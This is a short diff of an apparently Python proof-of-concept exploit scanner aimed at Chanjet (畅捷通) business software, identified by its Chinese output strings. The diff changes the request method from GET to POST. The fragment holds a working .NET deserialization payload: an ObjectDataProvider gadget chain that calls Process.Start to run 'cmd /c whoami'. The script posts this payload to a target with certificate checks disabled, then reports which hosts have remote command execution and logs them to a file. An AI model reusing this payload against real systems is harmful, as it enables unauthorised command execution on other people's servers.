@@ -36,7 +36,7 @@ def poc(target):
     }
     data = '{"storeID":{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c whoami > test1.txt"}}}}'
     try:
-        response = requests.get(url=target + payload, headers=headers,data=data, verify=False, timeout=10)
+        response = requests.post(url=target + payload, headers=headers,data=data, verify=False, timeout=10)
         if response.status_code == 200 and '{"value":new $T.DTO("Ufida.T.AA.DTO.WarehouseDTO, Ufida.T.AA.DTO, Version=12.3.0.0, Culture=neutral, PublicKeyToken=null",{"DtoClassName":"Ufida.T.AA.DTO.WarehouseDTO","AliName":"WarehouseDTO","Status":0,"ChangedProperty":[]}).UnTypify()}' in response.text:
             print(f"[+]{target}存在远程命令执行漏洞")
             with open('畅捷通App_result.txt', 'a') as f:
